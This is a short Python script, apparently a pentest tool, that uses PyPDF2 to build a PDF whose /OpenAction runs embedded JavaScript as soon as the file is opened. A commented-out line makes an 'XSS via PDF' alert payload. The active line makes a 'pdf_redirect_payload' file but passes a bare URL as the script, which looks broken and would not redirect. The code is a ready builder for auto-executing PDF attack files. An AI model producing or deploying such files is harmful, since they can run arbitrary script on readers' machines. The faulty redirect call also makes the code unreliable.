from PyPDF2 import PdfWriter
from PyPDF2.generic import (
    DictionaryObject,
    NameObject,
    createStringObject,
    NumberObject,
    IndirectObject
)

def create_pdf_with_js(output_filename, js_code):
    writer = PdfWriter()

    # A page is needed even if we only want JS
    page = writer.add_blank_page(width=595, height=842)

    # Create the JavaScript action
    js_action = DictionaryObject()
    js_action.update({
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): createStringObject(js_code)
    })

    # Add JS object to writer
    js_obj_ref = writer._add_object(js_action)

    # Attach OpenAction to root object (Catalog)
    writer._root_object.update({
        NameObject("/OpenAction"): js_obj_ref
    })

    # Write to file
    with open(output_filename, "wb") as f:
        writer.write(f)

    print(f"[+] PDF generato con successo: {output_filename}")

if __name__ == "__main__":
#    js_payload = 'app.alert("XSS via PDF");'
#    create_pdf_with_js("xss_payload.pdf", js_payload)
     destination_url = "https://www.example.it"
     create_pdf_with_js("pdf_redirect_payload.pdf", destination_url)
